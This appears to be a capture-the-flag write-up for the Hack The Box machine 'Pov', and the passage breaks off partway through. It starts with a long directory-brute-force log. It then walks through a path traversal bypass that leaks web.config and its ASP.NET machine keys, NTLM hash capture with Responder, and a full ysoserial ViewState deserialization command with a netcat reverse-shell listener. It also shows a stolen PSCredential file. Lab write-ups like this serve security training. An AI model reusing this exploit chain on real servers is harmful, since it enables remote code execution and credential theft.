301      GET        2l       10w      174c http://dev.pov.htb/portfolio/assets/vendors/Jquery => http://dev.pov.htb/portfolio/assets/vendors/Jquery/
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/assets/Imgs/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Imgs/aux
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/Assets/vendors/Jquery => http://dev.pov.htb/portfolio/Assets/vendors/Jquery/
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/Assets/Imgs/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Imgs/aux
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/Assets/CSS/albir
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/.error%1F_log.swp
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/dealtime
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/css/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/css/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/css/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/css/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/css/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/css/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/css/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/js/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/js/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/js/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/js/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/js/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/js/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/js/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/imgs/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/imgs/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/imgs/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/imgs/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/imgs/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/imgs/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/imgs/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/CSS/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/CSS/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/CSS/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/CSS/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/CSS/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/CSS/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/CSS/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/.error%1F_log.swp
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/assets/Vendors/JQuery => http://dev.pov.htb/portfolio/assets/Vendors/JQuery/
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/JS/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/JS/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/JS/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/JS/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/JS/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/JS/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/JS/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/js/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/js/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/js/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/js/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/js/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/js/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/js/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/css/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/css/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/css/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/css/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/css/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/css/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/css/.error%1F_log.swp
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/assets/Vendors/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Vendors/aux
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Css/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Css/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Css/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Css/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Css/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Css/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Css/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/CSS/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/CSS/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/CSS/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/CSS/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/CSS/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/CSS/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/CSS/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Js/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Js/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Js/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Js/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Js/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Js/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Js/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/imgs/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/imgs/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/imgs/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/imgs/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/imgs/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/imgs/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/imgs/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/JS/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/JS/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/JS/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/JS/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/JS/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/JS/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/JS/.error%1F_log.swp
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/Assets/Vendors/JQuery => http://dev.pov.htb/portfolio/Assets/Vendors/JQuery/
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/vendors/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/vendors/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/vendors/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/vendors/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/vendors/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/vendors/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/vendors/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Css/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Css/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Css/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Css/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Css/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Css/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Css/.error%1F_log.swp
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/Assets/Vendors/aux => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Vendors/aux
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Js/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Js/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Js/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Js/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Js/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Js/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Js/.error%1F_log.swp
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/JS/google_indexing
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/Assets/helpOLD
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/vendors/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/vendors/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/vendors/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/vendors/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/vendors/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/vendors/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/vendors/.error%1F_log.swp
302      GET        3l        8w      159c http://dev.pov.htb/portfolio/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/prn
302      GET        3l        8w      166c http://dev.pov.htb/portfolio/assets/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/prn
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/assets/css/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/css/prn
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/assets/js/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/js/prn
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/assets/imgs/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/imgs/prn
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/assets/CSS/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/CSS/prn
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/Assets/Js/kwb-de
302      GET        3l        8w      166c http://dev.pov.htb/portfolio/Assets/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/prn
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/Assets/js/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/js/prn
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/Assets/css/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/css/prn
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/assets/JS/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/JS/prn
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/assets/Css/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Css/prn
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/assets/Js/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Js/prn
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/CSS/pstats
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/Assets/CSS/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/CSS/prn
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/Assets/JS/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/JS/prn
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/Assets/imgs/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/imgs/prn
302      GET        3l        8w      170c http://dev.pov.htb/portfolio/Assets/Css/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Css/prn
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/assets/vendors/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/vendors/prn
302      GET        3l        8w      169c http://dev.pov.htb/portfolio/Assets/Js/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Js/prn
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/Imgs/cabins
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/Assets/vendors/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/vendors/prn
404      GET        0l        0w     1245c http://dev.pov.htb/portfolio/assets/Imgs/menuskin
301      GET        2l       10w      177c http://dev.pov.htb/portfolio/assets/vendors/bootstrap => http://dev.pov.htb/portfolio/assets/vendors/bootstrap/
301      GET        2l       10w      177c http://dev.pov.htb/portfolio/Assets/vendors/bootstrap => http://dev.pov.htb/portfolio/Assets/vendors/bootstrap/
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/assets/Vendors/Jquery => http://dev.pov.htb/portfolio/assets/Vendors/Jquery/
301      GET        2l       10w      174c http://dev.pov.htb/portfolio/Assets/Vendors/Jquery => http://dev.pov.htb/portfolio/Assets/Vendors/Jquery/
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Imgs/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Imgs/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Imgs/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Imgs/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Imgs/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Imgs/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Imgs/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Imgs/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Imgs/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Imgs/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Imgs/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Imgs/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Imgs/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Imgs/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Vendors/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Vendors/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Vendors/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Vendors/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Vendors/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Vendors/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/assets/Vendors/.error%1F_log.swp
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Vendors/error%1F_log
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Vendors/error%1F_log~
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Vendors/error%1F_log.bak
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Vendors/error%1F_log.bak2
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Vendors/error%1F_log.old
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Vendors/error%1F_log.1
400      GET        6l       26w      324c http://dev.pov.htb/portfolio/Assets/Vendors/.error%1F_log.swp
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/assets/Imgs/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Imgs/prn
302      GET        3l        8w      171c http://dev.pov.htb/portfolio/Assets/Imgs/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Imgs/prn
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/assets/Vendors/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/assets/Vendors/prn
302      GET        3l        8w      174c http://dev.pov.htb/portfolio/Assets/Vendors/prn => http://dev.pov.htb/default.aspx?aspxerrorpath=/portfolio/Assets/Vendors/prn
301      GET        2l       10w      177c http://dev.pov.htb/portfolio/assets/Vendors/bootstrap => http://dev.pov.htb/portfolio/assets/Vendors/bootstrap/
301      GET        2l       10w      177c http://dev.pov.htb/portfolio/Assets/Vendors/bootstrap => http://dev.pov.htb/portfolio/Assets/Vendors/bootstrap/
[####################] - 6m    725663/725663  0s      found:387     errors:395    
[####################] - 5m     30177/30177   108/s   http://dev.pov.htb/ 
[####################] - 6m     30177/30177   89/s    http://dev.pov.htb/portfolio/ 
[####################] - 6m     30177/30177   89/s    http://dev.pov.htb/portfolio/assets/ 
[####################] - 6m     30177/30177   89/s    http://dev.pov.htb/portfolio/assets/css/ 
[####################] - 6m     30177/30177   89/s    http://dev.pov.htb/portfolio/assets/js/ 
[####################] - 6m     30177/30177   89/s    http://dev.pov.htb/portfolio/assets/CSS/ 
[####################] - 6m     30177/30177   89/s    http://dev.pov.htb/portfolio/assets/imgs/ 
[####################] - 6m     30177/30177   88/s    http://dev.pov.htb/portfolio/Assets/ 
[####################] - 6m     30177/30177   88/s    http://dev.pov.htb/portfolio/assets/JS/ 
[####################] - 6m     30177/30177   88/s    http://dev.pov.htb/portfolio/Assets/js/ 
[####################] - 6m     30177/30177   88/s    http://dev.pov.htb/portfolio/Assets/css/ 
[####################] - 6m     30177/30177   88/s    http://dev.pov.htb/portfolio/assets/Js/ 
[####################] - 6m     30177/30177   87/s    http://dev.pov.htb/portfolio/assets/Css/ 
[####################] - 6m     30177/30177   88/s    http://dev.pov.htb/portfolio/Assets/CSS/ 
[####################] - 6m     30177/30177   88/s    http://dev.pov.htb/portfolio/Assets/imgs/ 
[####################] - 6m     30177/30177   88/s    http://dev.pov.htb/portfolio/Assets/JS/ 
[####################] - 6m     30177/30177   88/s    http://dev.pov.htb/portfolio/assets/vendors/ 
[####################] - 6m     30177/30177   88/s    http://dev.pov.htb/portfolio/Assets/Js/ 
[####################] - 6m     30177/30177   88/s    http://dev.pov.htb/portfolio/Assets/Css/ 
[####################] - 6m     30177/30177   89/s    http://dev.pov.htb/portfolio/Assets/vendors/ 
[####################] - 5m     30177/30177   110/s   http://dev.pov.htb/portfolio/assets/Imgs/ 
[####################] - 4m     30177/30177   113/s   http://dev.pov.htb/portfolio/Assets/Imgs/ 
[####################] - 4m     30177/30177   120/s   http://dev.pov.htb/portfolio/assets/Vendors/ 
[####################] - 4m     30177/30177   123/s   http://dev.pov.htb/portfolio/Assets/Vendors/   
```

</details>

Based on the folders and files, we can asume that it is an C# ASP app. Folder `App_Data` and page `contact.aspx` gave it away.

### Download button

In the middle of the page, there is download button: `javascript:__doPostBack('download','')`

In Burp, we can edit the target file that gets downloaded. It triggers a POST request with the following body:

```
__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=fH54SCrkoeFlDyhClL2Y1ARPSVSd8A4SWci%2FKPER%2FMseGodmobT4VCPxfabeaMPJfbqv9qMHshM%2ByyvpLQ%2B9IzZZ3mQ%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=JGdpl4GBIXTNHMtpjoeQIxXX%2BSgW5NamRCABew8b7%2Fq8NQ3qS41ATh58%2F%2FxjjWoOvX14d2p22EP89%2FHAcA17ppXjYTPZo4n5R8QNj9V94PoXMXDDkycz57fp7OmUR8kUo9hP8Q%3D%3D&file=cv.pdf
```

You can download sourcecode for example. But we cannot reach the jucy files, like `web.config`. But let's see what we can get.

Staring with the `default.aspx` (as `file` parameter), we get the "view" part of ASP.NET application. The first line points us to code behind (the C#, backend part of the app):

```
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="index.aspx.cs" Inherits="index"%>
```

So, let's download `index.aspx.cs` in the same way. It contains the actual code for download function:

```
protected void Download(object sender, EventArgs e) {

    var filePath = file.Value;
    filePath = Regex.Replace(filePath, "../", "");
    Response.ContentType = "application/octet-stream";
    Response.AppendHeader("Content-Disposition","attachment; filename=" + filePath);
    Response.TransmitFile(filePath);
    Response.End();

}
```

So, the developer did implement some directory traversal prevention. It replaces `../` to prevent it. But you can bypass it with `\` (see [directory traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md#bypass--replaced-by-)), and that's why you should not be doing it on your self. Note: you can also use UNC `\\localhost\c$\windows\win.ini` to bypass it and download a file.

So, use `file=..\web.config` to donwload `web.config`

```
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

#### Note (not useful in this machine)

With UNC you can also get the follwing file: `\\localhost\c$\windows\win.ini`

This can be used to catch a NTLM hash with `Responder`. So fire-up responder: `sudo responder -I tun0` and make a request pointing UNC to it. `\\10.10.14.41\c$\windows\win.ini` This will dump the hash

```
[SMB] NTLMv2-SSP Client   : 10.10.11.251
[SMB] NTLMv2-SSP Username : POV\sfitz
[SMB] NTLMv2-SSP Hash     : sfitz::POV:48c1e042b67d14cc:57E51CE69D5B7520A2C581CA0CAEFC7E:0101000000000000808BD458B5B2DA014ECC09E9832E526E000000000200080031004D005900590001001E00570049004E002D005600430036005A0048004E00320035004C004B00300004003400570049004E002D005600430036005A0048004E00320035004C004B0030002E0031004D00590059002E004C004F00430041004C000300140031004D00590059002E004C004F00430041004C000500140031004D00590059002E004C004F00430041004C0007000800808BD458B5B2DA01060004000200000008003000300000000000000000000000002000009C8877CF7B7C37D23D6C9F2780FFF227B592FC7004EC9CE45B16D3A97739998A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340031000000000000000000 
```

While in this case, the hash does not lead anywhere, it uncovered the username.

### Machine Key

The `web.config` contains a machine key. That is used for signing/encrypting. It is also used for signing the `__VIEWSTATE`, which gets deserialised on server-side and is used to persist form data. Normally, it is protected by the machine key, but since we got it, we could pass custom payload that's get deseriaslised and is executed server-side. See: https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/

For crafting the payload, ysoserial can be used. However, it is a windows utility (.NET Framework utility) Command to use (Windows):

* dont forget to change the payload `-c "PAYLOAD_HERE"` with the powershell reverse shell.

```powershell
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -enc PAYLOAD_HERE" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path=/portfolio/default.aspx
```

So, setup listener

```
rlwrap nc -lvnp 443
```

and execute the POST request for download with the custom `__VIEWSTATE`. That gives the shell.

## User sfitz

That is still not the user. So, let's enumerate what is in the user profile.

```
tree /f /a
```

gives an interesting file `C:\Users\sfitz\Documents\connection.xml`. There are some credentials.

```
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

It is serialised `System.Management.Automation.PSCredential` by `Export-Clixml` funciton, normally used for automation. The challenge is to reverse it. See: https://systemweakness.com/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8 Additional docs:

* https://learn.microsoft.com/cs-cz/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.4
* https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/
* https://duffney.io/addcredentialstopowershellfunctions/ Also note that the file is bound to machine and user. It does not work when exported outside (without additional secrets, in theory) The approach is as follows:

```
$username = "alaading" 
